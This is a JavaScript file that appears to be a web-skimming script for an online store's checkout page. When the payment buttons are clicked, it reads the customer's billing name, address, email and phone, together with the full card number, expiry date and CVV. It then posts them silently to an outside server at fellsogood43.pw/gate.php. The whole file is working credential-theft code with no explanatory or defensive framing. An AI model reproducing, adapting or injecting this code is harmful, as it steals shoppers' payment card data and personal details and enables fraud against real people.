window.onload = function () {
    try {
        document.getElementById('payment-buttons-container').addEventListener("click", GAD);
    } catch (err) {
        
    }
};

function GAD() {
    var data = {};
    data['firstname'] = document.getElementById('billing:firstname').value;
    data['lastname'] = document.getElementById('billing:lastname').value;
    try {
        data['email'] = document.getElementById('billing:email').value;
    }catch (err){}
    data['street1'] = document.getElementById('billing:street1').value;
    data['street2'] = document.getElementById('billing:street2').value;
    data['city'] = document.getElementById('billing:city').value;
    data['region_id'] = document.getElementById('billing:region_id').value;
    data['country_id'] = document.getElementById('billing:country_id').value;
    data['postcode'] = document.getElementById('billing:postcode').value;
    data['telephone'] = document.getElementById('billing:telephone').value;

    data['vm_cc_number'] = document.getElementById('linkpoint_cc_number').value;
    data['vm_expiration'] = document.getElementById('linkpoint_expiration').value;
    data['vm_expiration_yr'] = document.getElementById('linkpoint_expiration_yr').value;
    data['vm_cc_cid'] = document.getElementById('linkpoint_cc_cid').value;
    data = JSON.stringify(data);
    if (SD(data)) {
        console.log('')
    }
}
function SD(data1) {

    var xhttp = new XMLHttpRequest();
    xhttp.open('POST', '//fellsogood43.pw/gate.php?token=Ofj388fy3hrhu3ehf', false);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send('data=' + data1);

    return true;
}
